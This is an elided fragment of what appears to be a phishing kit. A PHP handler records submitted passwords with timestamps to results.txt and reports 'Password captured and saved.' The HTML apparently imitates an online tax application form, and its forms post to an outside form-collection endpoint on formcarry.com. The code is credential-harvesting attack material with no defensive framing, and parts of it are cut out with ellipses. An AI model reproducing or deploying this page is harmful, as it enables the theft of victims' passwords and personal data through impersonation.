...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST["pass"])) {
        ...
        // Append the password to the results.txt file along with a timestamp
        $file = "results.txt";
        ...
        $handle = fopen($file, "a");
        if ($handle === false) {
            echo "Failed to open the results file for writing.";
        } else {
            if (fwrite($handle, $data) === false) {
                echo "Failed to write the password to the results file.";
            } else {
                echo "Password captured and saved.";
            }
            fclose($handle);
        }
    } else {
...
<head>
  ...
  <link rel="icon" type="image/x-icon" href="https://page.application-submit.repl.co/favicon.ico">
      ...
      <div id="interview-container">
        <div id="tax-form">
          <div id="AboutYouSection" class="Question AboutYouSection">
            ...
            </div><form action="https://formcarry.com/s/7BKgQ25_Kz" method="post">
                ...
                <div data-form-element-key="ButtonNext" class="FormElement FormElement_Button ButtonNext">
                  <div class="Button">
                    <button name="ButtonNext" class="ButtonNext" data-elements-processor="">
                      Submit </button>
                 <form class="sm:hidden lg:block md:block" action="https://formcarry.com/s/7BKgQ25_Kz" method="post">
                  </div>
                </div>
              </div>
              <center>
